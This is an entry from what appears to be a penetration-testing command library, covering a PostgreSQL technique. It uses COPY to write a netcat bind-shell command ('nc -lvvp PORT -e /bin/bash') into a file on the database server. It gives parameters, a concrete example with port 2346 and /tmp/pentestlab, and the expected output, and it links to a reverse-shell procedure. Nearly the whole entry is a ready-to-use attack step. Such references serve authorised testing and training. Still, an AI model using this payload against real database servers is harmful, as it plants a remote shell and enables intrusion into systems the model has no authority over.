---
id: a063495a-a056-463a-bc9c-82bf3e094fc4
type: command
executor: psql
data: COPY (SELECT 'nc -lvvp $_PORT -e /bin/bash') TO '$_FILE_PATH';
output: null
created_at: '2023-04-06T03:56:35.993295+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - postgresql
  - file-write
  - payload
verified: true
validated: true
---

# postgresql-copy-nc-command-to-file

## Command

```sql
COPY (SELECT 'nc -lvvp $_PORT -e /bin/bash') TO '$_FILE_PATH';
```

## Description

Directly copies the output of a SELECT (bind shell command) to a server file without needing a table.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PORT | Bind port (e.g., 2346) | Yes |
| $_FILE_PATH | Output file path | Yes |

## Examples

### Basic Usage

```sql
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

## Expected Output

"COPY 1" confirming write.

## Related

- [[procedures/PostgreSQL-File-Write-with-Reverse-Shell-Payload]]
